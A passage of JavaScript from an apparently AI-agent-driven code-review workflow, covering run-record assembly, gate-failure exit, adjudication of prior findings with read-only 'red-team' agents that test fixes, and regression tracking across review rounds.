// on failure would be invisible exactly when the review passes — which is most of the time, and is
// precisely when a dependency backlog quietly grows.
function carriedSection() {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `- [${r.profile.id}] ${c}`))
  return all.length
    ? `\n## Pre-existing — reported, not blocking\nThese are real and RED, but this diff did not cause them and no edit to the changed files clears them:\n${all.join('\n')}\n`
    : ''
}

// The synthesis agent writes the main report; a section it is not told about simply does not exist.
const carriedLine = (() => {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `[${r.profile.id}] ${c}`))
  return all.length
    ? ` Then a \`## Pre-existing — reported, not blocking\` section listing these VERBATIM, one per line — they are RED and real but this diff did not cause them, so they must appear in the report while changing NOTHING about the verdict: ${JSON.stringify(all)}.`
    : ''
})()

// A short, stable digest of a text, for recording WHAT a round was given without carrying the text.
/** @param {string} text */
function digest(text) {
  return [...String(text ?? '')].reduce((h, c) => ((h * 31) + c.charCodeAt(0)) >>> 0, 7).toString(16)
}

/** @param {Record<string, unknown>} extra */
function reviewRecord(extra) {
  return {
    schemaVersion: 1,
    runtime: 'claude-code',
    craftVersion: CRAFT_VERSION,
    kind: 'workflow',
    name: 'review',
    nested: !!viaArg,
    via: viaArg || null,
    branch, head,
    languages: active.map(p => p.id),
    uncoveredFiles,
    lensRounds: results.flatMap(r => (r.lensRounds || []).map(x => ({ language: r.profile.id, ...x }))),
    scout: results.map(r => ({ language: r.profile.id, size: r['plan'].sizeBucket, lenses: r['plan'].lenses, model: r['plan'].lensModel, maxRounds: r['plan'].maxRounds, verifyVotes: r['plan'].verifyVotes, securitySensitive: !!r['plan'].securitySensitive, isLibrary: !!r['plan'].isLibrary })),
    gate: runGate,
    // The optional pass, on the record: `skipped` is the field that keeps a cheap run from reading
    // later — in analyze-runs, in a comparison between two runs — as a full one.
    optionalPass: { requested: optionalRequested, ...optionalTally(), namedByCritic: [...optionalNamedByCritic] },
    // realm @nick/craft #102: surfaceGate recorded for later analyze-runs measurement. Mirrors
    // optionalPass so a cheap surface-gated run does not read later as one that never planned those
    // whole-repo lenses: `dropped` is the load-bearing field, `namedByCritic` the lenses the
    // completeness critic flagged that the gate deliberately kept dropped. Built by surfaceGateRecord
    // from the per-profile `surfaceDropped`: only profiles past their mechanical gate count (a red
    // profile's drops were never in play), and a lens dropped in one profile but dispatched in
    // another (a mixed-diff run) is not counted as saved — the same set surfaceGateSection() prints.
    // Run-level across profiles (same scope as optionalPass), sorted and unique. `dispatched` is read
    // directly off `surfaceGateDispatched` — the same dispatch-point Set the saving subtracts, and the one source that survives the
    // gateFailed early-exit — so analyze-runs can compute a share (saved / (saved + dispatched))
    // without trusting the per-profile `dimensions` snapshot, which does not.
    surfaceGate: surfaceGateRecord(results, { dispatched: surfaceGateDispatched, namedByCritic: surfaceGateNamedByCritic }),
    // Every breach of the preflight probe budget, per language. Recorded on EVERY run, clean or
    // not: the point of the audit is that the next drift back into CI archaeology shows up in the
    // record of the run that did it, not in a re-measurement months later.
    preflightProbeViolations: results.flatMap(r => (r['probeViolations'] || []).map((/** @type {string} */ v) => `[${r.profile.id}] ${v}`)),
    // realm @nick/craft #104: did re-review memory engage this run, and if not, why. `chained` is false
    // with reason 'no-branch' on a detached HEAD — the silent round-1 degradation this field makes
    // legible in the record (the operator-facing half is reReviewMemorySection() in the report).
    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.['round'] ?? null, priorHead: priorRound?.['head'] ?? null },
    // What the lenses were run over and how, so a later comparison of two rounds can tell a memory
    // effect from a scope or configuration effect (lib/round-pairs.mjs, realm @nick/craft #97): a
    // `delta` round on an unchanged head reviews an empty diff.
    lensScope: fullRescan ? 'full' : 'delta',
    strict,
    fullEvery,
    // One name and one shape with rust-audit, keyed by agent type (lib/agent-fallback.mjs, realm @nick/craft #151).
    ...agentUnavailableRecord(reviewerAgentUnavailable.map(x => x.agent),
      Object.entries(reviewerAgentFallbacks).map(([id, count]) => ({ agent: reviewerAgentNames[id] || id, count }))),
    // Against which base and path the diff was taken, which lenses the critic added on top of the plan,
    // and a digest of the caller's intent text (it feeds the intent lens) — all of which change what a
    // round costs without being memory (lib/round-pairs.mjs, realm @nick/craft #97).
    base: baseRef || '',
    path: pathArg || '',
    criticFollowups: results.flatMap(r => (r['criticFollowupLenses'] || []).map((/** @type {string} */ l) => `${r.profile.id}:${l}`)).sort(),
    intentDigest: digest(intentArg),
    // The author's description that reaches every lens (PR title/body or commit messages), and the
    // changed-file set the diff was taken over — both fetched each round, both change what a round does.
    specDigest: digest(spec),
    filesDigest: digest([...changedFiles].sort().join('\n')),
    outputTokens: budget.spent(),
    ...extra,
  }
}

async function gateFailedExit() {
  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `[${r.profile.id}] ${c}`)) }))
  return out([
    `## Verdict`,
    `⛔ Block — mechanical gate is red (${gateFailed.map(r => r.profile.id).join(', ')}).`,
    ``,
    `## Gate`,
    mergedProvenance,
    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `- [${r.profile.id}] ${c}`)).join('\n')}`,
    carriedSection(),
    scopeSection(),
    ``,
    `Fix the gate before a semantic review is worthwhile.`,
  ].join('\n'))
}
if (gateFailed.length) return await gateFailedExit()

let confirmed = results.flatMap(r => r['confirmed'])
let suspected = results.flatMap(r => r['suspected'])
// Low/Info nothing looked at. A third track, not a corner of Suspected — see verifyPool.
let unverified = results.flatMap(r => r['unverified'] || [])

// ---- Adjudicate track (re-review only) ----
// For each prior-round finding, decide its fate this round. rejected/justified are carried (not
// re-raised) unless the code around them changed; open/deferred/confirmed priors get a targeted
// "is it still here?" check against the current tree.
// `retired` is the carried track's EXIT: a dismissed prior whose carry-check reported the code
// around it unchanged has had its one confirmation and leaves the ledger. It still lives here for
// the rest of THIS round — it suppresses a lens re-discovery (below) and renders in the report's
// carried section — but it is not re-persisted, so it never costs another carry agent.
/** @type {{ resolved: Finding[], stillOpen: Finding[], regressed: Finding[], carried: Finding[], retired: Finding[] }} */
const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [], retired: [] }
// Tombstones: resolved/retired priors from EARLIER rounds, kept only as a recidivism check (a fresh
// finding matching one is a regression, not a novelty). Filled on load below and read again at the
// absorption pass — declared out here so both see it. It rides the persisted ledger like any row, so
// a lost tombstone is caught by the same ledgerCount check every other row is.
/** @type {LedgerAnswer[]} */
const priorTombstones = []
/** Priors carrying the unverified tier re-enter this round's unverified track. @param {Finding[]} priorUnverified @param {PriorRound} priorRound */
function carryUnverifiedPriors(priorUnverified, priorRound) {
  if (priorUnverified.length) {
    log(`${priorUnverified.length} prior finding(s) carry the unverified tier — never checked against the code, so nothing to adjudicate: carried forward as unverified rather than promoted to still-open`)
    unverified = unverified.concat(priorUnverified.map((/** @type {Finding} */ f) => ({
      ...f,
      fix: f['fix'] || 'verify it first — nothing has checked this claim against the code',
      blastRadius: f['blastRadius'] || '',
      tier: 'unverified',
      // Flagged so the tracking pass below can use these as HOSTS. They are not in `livePriors` —
      // they were never adjudicated — so without the flag a fresh unverified re-discovery of the
      // same site is neither marked nor collapsed, and the site gains a ledger row every round.
      carriedUnverified: true,
      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRound['round']}, where no verifier judged it; nothing has checked it against the code since)`,
    })))
  }
}
// The adjudicate track, on a re-review with a prior ledger.
async function adjudicatePriors() {
  if (priorRound?.['ledger']?.length) {
    phase('Adjudicate')
    // Canonicalize prior severity ONCE, at the load boundary, BEFORE splitting/adjudicating/carrying:
    // LEDGER_ITEM.severity has no enum, so a drifted `critical`/`CRITICAL` prior would trip the
    // case-insensitive gates (isHighSeverity in classifyRedTeam / the red-team gate) yet be bucketed as
    // 0 Critical/0 High by countBySeverity (exact-case) — a fail-open re-review Approve over a
    // still-broken Critical fix. Mapping through canonicalSeverity here means adjudicateOne's
    // `located = {...f}` and EVERY downstream verdict/count (countBySeverity, rereviewVerdict, the strict
    // escalation) and the re-persisted ledger all see canonical severity for priors.
    const priorLedgerAll = priorRound['ledger'].map(f => ({ ...f, severity: canonicalSeverity(f['severity']) }))
    // TOMBSTONES ARE CARVED OUT BEFORE THE SPLIT. A `disposition:'closed'` row is a resolved/retired
    // prior kept only so a later round can recognise the defect's return — it is already answered.
    // Left in the pool it would fall into `toCheck` below and be sent to the adjudicator, spending an
    // agent to ask whether a closed defect is "still present" at a site where nothing remains to judge.
    // So it is pulled here and never enters the unverified/settled/toCheck partitions.
    priorTombstones.push(...priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] === 'closed'))
    const priorLive = priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] !== 'closed')
    // THE UNVERIFIED TIER SURVIVES THE ROUND BOUNDARY. A prior carrying `tier: 'unverified'` was never
    // checked against the code — so there is nothing to adjudicate: "is the defect still present?"
    // presumes someone established it was present. Adjudicating it anyway routed it into `stillOpen`,
    // where it renders as a live prior finding AND feeds the verdict (`rereviewVerdict` counts
    // stillOpen) — so a finding no verifier ever looked at became a gating one after one hop, and the
    // tier that exists to say "nothing checked this" lived only inside the round that minted it.
    // It re-enters THIS round's own unverified track instead: label kept, out of the verdict, out of
    // the refutation denominator, re-persisted as `unverified` for the next round.
    const priorUnverified = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') === 'unverified')
    carryUnverifiedPriors(priorUnverified, priorRound)
    const priorLedger = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') !== 'unverified')
    const settled = priorLedger.filter((/** @type {Finding} */ f) => f['disposition'] === 'rejected' || f['disposition'] === 'justified')
    const toCheck = priorLedger.filter((/** @type {Finding} */ f) => !(f['disposition'] === 'rejected' || f['disposition'] === 'justified'))

    // Settled priors: carried unless the code around them changed since the prior round.
    const carriedResults = (await parallel(settled.map((/** @type {Finding} */ f) => () => {
      const pf = promptFields(f)
      return ragent(
        `A prior review finding was dismissed by the author (disposition: ${f['disposition']}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound['head'])}. Shell + read only.
FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f['line']} (symbol ${pf.symbol}), rule ${pf.ruleId}.
Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
        { label: `carry:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
      ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
    }))).filter(x => x != null)
    // A dead carry agent (changed == null) is indeterminate — keep the dismissed prior as carried (do
    // NOT reopen on an indeterminate carry), but count + ⚠️-log it like the other death paths so this
    // is no longer the one unaudited death path.
    //
    // THE EXIT, AND WHY IT LOSES NOTHING. A dismissal is the author's decision; the only thing that
    // can invalidate it is the code around it changing. So one carry-check that says "unchanged" is
    // the whole answer, and re-asking it every round forever buys nothing — it was the only track
    // with no exit at all, costing one agent per dismissal per round in perpetuity. A retired prior
    // is not forgotten into silence: the lenses raise the finding fresh, on its merits — which is
    // exactly what the `changed === true` branch does here, minus the stale `rejected` label.
    //
    // WHEN THE RE-RAISE HAPPENS, HONESTLY. Not only "if that code is ever touched again". On a full
    // re-scan the lenses see the whole diff and re-invent every prior, so the re-discovery can land in
    // the SAME round the dismissal retires: partitionAbsorbed refuses to absorb into a retired host
    // (it is not persisted), the finding is KEPT, and it enters the next ledger as `open`. The
    // author's dismissal is then undone with no code change, and next round it costs a full
    // adjudicator instead of a cheap carry agent.
    //
    // THAT IS THE ACCEPTED COST, AND THE ALTERNATIVE IS WORSE. Dropping a finding whose only carrier
    // retired would reinstate exactly the loss class partitionAbsorbed exists to close: retirement is
    // judged at REGION granularity while the carrier matches on file+ruleId, so a genuinely NEW defect
    // elsewhere in the same file under the same rule would be discarded by a host whose own region did
    // not move — silently, into no report and no ledger. Losing a label is recoverable (the author
    // re-dismisses it, once); losing a defect is not.
    //
    // An INDETERMINATE carry-check (agent died) retires nothing: it stays carried and is asked again
    // next round.
    let carryDied = 0
    /** @param {(typeof carriedResults)[number]} c */
    const applyCarry = c => {
      const { f, changed } = c
      if (changed === null) { carryDied++; log(`⚠️ carry-check for ${f.file}:${f.line} died — kept as carried by default`); adjudicated.carried.push(f) }
      else if (changed) adjudicated.stillOpen.push({ ...f, why: `${baseWhy(f.why)} (reopened: dismissed as ${f.disposition}, but the code around it changed — re-verify the justification)` })
      else adjudicated.retired.push(f)
    }
    for (const c of carriedResults) applyCarry(c)

    // Open/deferred/confirmed priors: is the defect CLASS still present at its (re-located) site?
    // The adjudicator must state the violated invariant and attack the fix — a fix that closes the
    // literal repro but not the class must not close. A "resolved" Critical/High is then re-attacked
    // by an independent red-team agent that never sees the adjudicator's verdict.
    const adjudModel = results[0]?.['plan']?.lensModel || 'opus'
    let overturned = 0
    let redTeamDied = 0
    let invalidRedTeam = 0
    let adjudicatorDied = 0
    let cannotTellCount = 0
    const redTeam = async (/** @type {Finding} */ f, /** @type {AdjudicateAnswer} */ adj) => {
      if (!isHighSeverity(f['severity'])) return adj
      const pf = promptFields(f)
      const rt = await ragent(
        `A code-review finding was raised on an earlier revision of this repo and the author has since pushed fix commits. Attack the fix. Shell + read only; do NOT hunt for unrelated bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
INVARIANT it violated: ${redTeamInvariant(adj, f)}
METHOD: re-locate the symbol (grep it — the line has likely moved), read the current code, and try to CONSTRUCT a concrete input/state that violates the invariant even with the current code in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check every candidate against the actual code paths before claiming it works.
Return {defeated, attack} — defeated=true ONLY with a concrete attack that survives your own check against the code.`,
        { label: `redteam:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
      )
      // A dead red-teamer keeps `resolved`: the adjudicator already ran its own attack pass, and a
      // transient agent death must not spuriously reopen findings. But the degradation must be
      // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
      // from "red-team never ran" in the report and the run log.
      const { adj: out, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
      if (died) { redTeamDied++; log(`⚠️ red-team for ${f['file']}:${f['line']} died — "resolved" stands on the adjudicator's own attack pass only`) }
      if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f['file']}:${f['line']} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
      if (ov) overturned++
      return out
    }
    const checkResults = (await parallel(toCheck.map((/** @type {Finding} */ f) => () => {
      const pf = promptFields(f)
      return ragent(
        `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${/** @type {Profile} */ (active[0]).rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
METHOD:
  1. State in ONE sentence the INVARIANT this finding violated — the property that must hold, not the literal repro (derive it from the why/title).
  2. Re-locate the symbol (grep it — the line has likely moved) and read the fix.
  3. Construct AT LEAST TWO concrete attacks: inputs/states that would violate the invariant while the current fix is in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check each against the actual code.
  4. Decide:
  - "resolved": every attack fails — the fix closes the CLASS, not just the described instance.
  - "still-open": the defect is still present OR one of your attacks succeeds (cite the current file:line; put the attack in \`attack\`).
  - "cannot-tell": you could NOT determine the answer — the file is gone or renamed, the symbol no longer exists, or you could not read enough of the code to judge. Say why in \`note\`. Use this rather than "resolved" whenever you are guessing: "resolved" means you checked and every attack failed, never "I could not find it".
  - "regressed": the site was changed but now has a DIFFERENT defect of the same kind (cite it).
Return {status, currentLine, note, invariant, attack}.`,
        { label: `adjudicate:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
      ).then(async r => ({ f, r: r && shouldRedTeam(r) ? await redTeam(f, r) : r }))
    }))).filter(x => x != null)
    /** @param {(typeof checkResults)[number]} c */
    const tallyAdjudication = c => {
      const { f, r } = c
      const { track, entry, demoted, cannotTell, adjudicatorDied: adjDied } = adjudicateOne(f, r)
      if (demoted) log(`⚠️ adjudicator for ${f.file}:${f.line} returned resolved WITH an attack — demoting to still-open`)
      if (cannotTell) { cannotTellCount++; log(`⚠️ adjudicator for ${f.file}:${f.line} could not tell — kept still-open, marked UNVERIFIED in the report`) }
      if (adjDied) { adjudicatorDied++; log(`⚠️ adjudicator for ${f.file}:${f.line} died — no verdict returned; kept still-open by default`) }
      adjudicated[track].push(entry)
    }
    for (const c of checkResults) tallyAdjudication(c)
    log(`Adjudicate: ${adjudicated.resolved.length} resolved · ${adjudicated.stillOpen.length} still-open · ${adjudicated.regressed.length} regressed · ${adjudicated.carried.length} carried · ${adjudicated.retired.length} carried→retired (code unchanged; leaves the ledger) · ${overturned} overturned by red-team · ${redTeamDied} red-team died · ${invalidRedTeam} invalid red-team · ${adjudicatorDied} adjudicator died · ${cannotTellCount} could not tell · ${carryDied} carry died`)
  }
}
await adjudicatePriors()

// On a re-review, lenses can re-surface a finding that is already tracked on the adjudicate track —
// always on a full re-scan (the lenses saw the whole diff), and even on the delta path when a fix
// commit touches a still-open site. A new finding already carried by a still-LIVE prior
// (still-open/regressed/carried/retired) is ABSORBED into that prior rather than listed separately,
// so it is not double-counted in the report or appended to the persisted ledger — the append is what
// made the carried set, and therefore the per-round adjudicator bill, grow every round.
// ABSORBED IS NOT DISCARDED: the finding is recorded onto its host's `why` (absorbInto), a persisted
// ledger field, so it outlives the round the host RESOLVES and leaves the ledger — the failure mode
// the old comment named as future and which was in fact already live. The match is file+ruleId
// (findCarrier); the reasoning for that coarseness is in lib/review-adjudicate.mjs. matchesPrior is
// the fallback for a finding with no ruleId to key on.
// Do NOT dedup against RESOLVED priors: a new finding matching a resolved one is a regression signal
// and must survive.
/** The judged tracks' findings absorbed into the still-live priors they repeat. @param {Finding[]} livePriors @param {Set<Finding>} retired */
function absorbIntoLivePriors(livePriors, retired) {
  // A RETIRED host absorbs NOTHING — it is not persisted, so a clause on it would leave the
  // absorbed report in no report and no ledger. partitionAbsorbed keeps those findings instead;
  // the reasoning (and why the granularity mismatch makes this the loss class the design set out
  // to close) is in lib/review-adjudicate.mjs.
  // ONE threaded accumulation across both tracks, not two independent ones: the tracks share
  // hosts (the carrier key is file+ruleId, orthogonal to the confirmed/suspected split), and two
  // independent partitions would each compute their clause from the same un-absorbed `host.why`,
  // so applying them afterwards would drop one report entirely — into no track, no host and no
  // ledger. absorbAcross returns the cumulative `updates`; it is applied once.
  // ONLY the JUDGED tracks are absorbed. An unverified finding may not be written onto a prior's
  // `why`: that clause tells the next adjudicator that "resolved" requires the absorbed report to
  // be gone, which lets something nothing ever checked hold a prior open and gate the re-review
  // verdict — the exact substitution the unverified tier exists to end, and it carries a dead
  // verifier's Critical/High, not just an unpaid-for Low. It is marked in place instead
  // (markTrackedUnverified), so it neither disappears into the prior nor gates anything.
  const { runs, updates, absorbed, keptAtRetired } = absorbAcross([confirmed, suspected], livePriors, retired, matchesPrior)
  for (const [host, why] of updates) host.why = why
  // Two lists in, two runs out — absorbAcross returns one run per list, in order.
  confirmed = /** @type {(typeof runs)[number]} */ (runs[0]).kept
  suspected = /** @type {(typeof runs)[number]} */ (runs[1]).kept
  if (absorbed) log(`Re-review: absorbed ${absorbed} new finding(s) into a still-live prior at the same file+rule — recorded on the prior's why (and delivered to next round's adjudicator as its own prompt lines) so they outlive it, not listed twice`)
  if (keptAtRetired) log(`Re-review: ${keptAtRetired} new finding(s) matched a prior that RETIRED this round — kept as findings rather than absorbed into a host that does not reach the next ledger`)
}
/** Unverified findings at a site a live prior tracks: marked, or collapsed onto an unverified prior. @param {Finding[]} trackingHosts @param {Set<Finding>} retired @param {Finding[]} carriedUnverified */
function trackUnverifiedAtPriors(trackingHosts, retired, carriedUnverified) {
  const tracked = markTrackedUnverified(unverified.filter(f => !f.carriedUnverified), trackingHosts, retired, matchesPrior)
  unverified = tracked.kept.concat(carriedUnverified)
  // A COLLAPSED ROW IS NOT A DISCARDED FINDING. The carrier key is file+ruleId, coarser than a
  // site, so the row dropped from the ledger can be a genuinely distinct defect on another line.
  // Its site is written onto the host through the same bounded clause absorption uses; the reason
  // this is not the obligation absorption was refused for is in lib/review-adjudicate.mjs.
  // WHAT "BOUNDED" MEANS HERE, EXACTLY: the bound is ABSORBED_MAX and it is GLOBAL, not per round.
  // At most three sites are ever NAMED on one host's `why`; a fourth and every later one — in this
  // round or any later one — is traded for the overflow counter, so its line, title and rationale
  // do not reach the next ledger. That is not a lost finding: it is in THIS round's report, the
  // counter keeps "more than one defect sits here" true, and the lenses re-raise the site next
  // round. It is a loss of detail, and the cap is deliberate (absorbInto's clause is re-interpolated
  // into every later prompt) — but it is a cap, so do not read the clause as a per-site record.
  // OPEN, AND DELIBERATELY NOT CLOSED HERE: an unverified row has no exit from the ledger, so its
  // `why` still accretes across rounds through the per-round NOT_VERIFIED suffixes, which have no
  // cap of their own. The growth is of one persistent field, and bounding it is its own work.
  for (const [host, why] of tracked.updates) host.why = why
  if (tracked.marked) log(`Re-review: ${tracked.marked} unverified finding(s) sit at a site a still-live prior already tracks — noted on each, NOT absorbed into the prior: nothing checked them, so they may not hold it open`)
  if (tracked.collapsed) log(`Re-review: ${tracked.collapsed} unverified finding(s) sit at a site an equally UNVERIFIED prior already holds in the ledger — shown in this round's report but not persisted as a second ledger row, so an unchecked site does not gain a row per round`)
}
/** Why the prior round's fingerprint basis could not be established, as the lost-memory note names it. */
function unknownBasisWhy() {
  return priorBasisMismatch
      ? 'the revisions the loader printed did not survive transport intact (the list no longer matches its own check string) — a transport or version-skew loss'
      : (Array.isArray(priorRound?.['priorFpRevisions']) || typeof priorRound?.['fpBasisKnown'] === 'boolean')
      ? 'it was recovered from a stopped run whose checkpoints do not attest to one basis, its record could not be read, or it was written by an engine this one cannot place (no engine revision, or a newer one: a downgrade, or two installs sharing one store)'
      : 'the loader\'s answer did not say whether the basis was known (a relay that dropped the field, or a logger older than it) — a transport or version-skew loss'
}
/** The recidivism check skipped: the prior's fingerprints are not comparable, so its tombstones are dropped (and said so). */
function dropTombstonesForBasis() {
  // The prior round's fingerprints are not established as comparable to this round's freshly computed
  // ones (a different basis, a different engine, or a basis that could not be established). Skip the
  // check rather than comparing incompatible hashes and missing a regression in silence — the exact
  // silent miss this guard exists to remove. The tombstones minted from THIS round on are all under
  // the current basis (the incomparable carried ones are dropped at assembly), so the memory rebuilds
  // from here; the cost is recorded on the run record (reReview.tombstonesDropped).
  tombstonesDroppedForBasis = priorTombstones.length
  if (priorBasisVerdict === 'absent') {
    // The answer carried no basis verdict at all — the loader printed none (a logger of another craft
    // version) or the relay dropped it; the schema leaves it optional precisely so this stays visible
    // rather than being filled with a guessed boolean. It is a LOSS of re-review memory (the carried
    // tombstones are dropped for good), so it is stated where lost memory is stated, above the verdict.
    const note = `The prior round's answer carried no fingerprint-basis verdict (sameFpBasis), so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered. This is a transport or version-skew loss, not a fingerprint-basis change.`
    reReviewMemoryNote = reReviewMemoryNote ? `${reReviewMemoryNote}\n${note}` : note
    log(`⚠️ ${note}`)
  } else if (priorBasisVerdict === 'unknown') {
    // A round recovered from a stopped run whose checkpoints do not attest to one known basis, read
    // from an unreadable record, or written by an engine this one cannot place (no revision, or a newer
    // one) cannot establish the basis its tombstones were minted under. (A recovered round whose
    // checkpoints DO attest to one is decided like any other — realm @nick/craft #112.) Comparing anyway is the silent miss the guard exists
    // to prevent, so they are still dropped — but that is lost memory, and it is said so.
    // When the answer carried neither the raw revisions nor fpBasisKnown, the loader may well have known the basis —
    // the relay dropped the field, or a logger older than it answered — so the cause named is that.
    const why = unknownBasisWhy()
    const note = `The fingerprint basis of the prior round could not be established — ${why} — so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered.`
    reReviewMemoryNote = reReviewMemoryNote ? `${reReviewMemoryNote}\n${note}` : note
    log(`⚠️ ${note}`)
  } else {
    log('Re-review: the prior round was fingerprinted under a different, known basis — so the recidivism check is skipped and its ' + priorTombstones.length + ' carried tombstone(s) are dropped; the memory rebuilds from this round on (expected once, right after an upgrade that changed the basis)')
  }
}
/** Fresh findings matching a prior tombstone: annotated as a regression or a re-raised dismissal. */
function flagReturningDefects() {
  /** @type {Map<string, LedgerAnswer>} */
  const tombstoneByFp = new Map()
  for (const t of priorTombstones) if (t.ruleId) tombstoneByFp.set(t.fp || fingerprint(t), t)
  let regressions = 0
  let reraised = 0
  const flagRegression = (/** @type {Finding} */ f) => {
    if (!f['ruleId']) return
    const hit = tombstoneByFp.get(fingerprint(f))
    if (!hit) return
    const why = String(hit.why || '')
    const m = /round (\d+)/.exec(why)
    // A LEDGER_ITEM carries no round, so this falls through to '?' unless a ledger extra supplies one.
    const r = m ? m[1] : (/** @type {{ round?: unknown }} */ (hit).round || '?')
    if (/^dismissed /.test(why)) {
      f['why'] = `${f['why']} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
      reraised++
    } else {
      f['why'] = `${f['why']} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
      regressions++
    }
  }
  confirmed.forEach(flagRegression)
  suspected.forEach(flagRegression)
  unverified.filter(f => !f.carriedUnverified).forEach(flagRegression)
  if (regressions) log(`Re-review: ${regressions} fresh finding(s) match a defect RESOLVED in an earlier round — annotated as REGRESSION in the report; the verdict still counts each by its severity`)
  if (reraised) log(`Re-review: ${reraised} fresh finding(s) match a defect the author DISMISSED in an earlier round — annotated as re-raised, not a regression; the verdict still counts each by its severity`)
}
// Absorption, unverified tracking and the recidivism check against the prior round's ledger.
function reconcileWithPriors() {
  if (priorRound) {
    const livePriors = [...adjudicated.stillOpen, ...adjudicated.regressed, ...adjudicated.carried, ...adjudicated.retired]
    // A RETIRED host absorbs NOTHING and tracks nothing — hoisted because BOTH passes below need it.
    const retired = new Set(adjudicated.retired)
    // Priors carrying the unverified tier were never adjudicated, so they are absent from `livePriors`
    // — they were carried straight into THIS round's `unverified` list instead. They are nonetheless
    // still-live rows of the next ledger, and they are precisely the hosts that matter for a site that
    // stays unchecked round after round, which is why the tracking pass takes them too.
    const carriedUnverified = unverified.filter(f => f.carriedUnverified)
    if (livePriors.length) absorbIntoLivePriors(livePriors, retired)
    // The tracking pass runs on its OWN guard, not inside the absorption one: a round whose only live
    // prior carries the unverified tier has an EMPTY `livePriors` (nothing was adjudicated) and is
    // exactly the round where a site accretes a second unchecked row. And that is only the EMPTY case:
    // a site can hold a live judged prior AND a carried unverified one at the same file+rule, and the
    // judged one comes first in this array. The collapse must not depend on that — markTrackedUnverified
    // picks its host BY TIER, not by this order (see lib/review-adjudicate.mjs); the order here is only
    // the fallback for a finding no unverified host tracks.
    const trackingHosts = [...livePriors, ...carriedUnverified]
    if (trackingHosts.length) trackUnverifiedAtPriors(trackingHosts, retired, carriedUnverified)
    // RECIDIVISM. A freshly discovered finding whose fingerprint matches a prior tombstone has RETURNED,
    // and the two tombstone ORIGINS mean different things. A `resolved` tombstone is a defect that was
    // actually fixed, so a match is a REGRESSION — the fix came undone. A `dismissed` tombstone is a
    // prior the AUTHOR rejected/justified and whose carry-check found the code around it UNCHANGED
    // (retirement): the engine's own separate `reopened` path already handles the code-CHANGED case, so
    // a match here is not a regression at all — nothing was fixed and nothing broke — it is the same
    // dismissed defect being re-raised, and it is labelled as exactly that. Exact fingerprint match
    // only, and only for a finding that carries a ruleId: an ad-hoc finding has no stable identity, so
    // it gets no tombstone check rather than a fuzzy one (fuzzy title matching was measured at 2/59
    // recall). This is a HUMAN-FACING annotation on `why` only: it neither moves the finding between
    // tiers nor changes the verdict, which still counts each returning finding by its own severity
    // exactly as a novel one (whether a regression should escalate the verdict is a separate decision,
    // deliberately not taken here). All three live tiers are scanned — confirmed, suspected AND
    // unverified — because the unverified tier is precisely where a returning defect lands when its
    // verifier died or was floor-skipped, which is the run where the "it came back" signal matters most;
    // carried-unverified priors are excluded, as they are not freshly discovered.
    if (priorTombstones.length && !priorFpComparable) dropTombstonesForBasis()
    else if (priorTombstones.length) flagReturningDefects()
  }
}
reconcileWithPriors()

const dropped = results.reduce((n, r) => n + r['dropped'], 0)
// Findings whose verdict was reached after at least one returned vote was DISCARDED as off-schema.
// DERIVED from the flag tierFromVotes sets, not pushed from a branch — the same discipline `notRun`
// is built with, and for the same reason. Read over `results` (what verification produced) rather
// than the post-absorption lists, because this counts the panels, not what survived the report; the
// REFUTED side is included deliberately — a finding deleted from the run on a thinned panel is the
// worst case this counter exists to make visible.
// The UNVERIFIED side is in the population for the same reason, and it is the largest class: a panel
// whose EVERY returned vote answered off-schema is routed to the unverified tier, which is the
// MAXIMUM discard there is. Reading only the judged tiers made the counter report 0 for exactly that
// case, so the field was short by its biggest class and the cross-run ranking could not see the class
// at all. The skipped Low/Info share that tier and carry no flag, so the filter excludes them by
// construction.
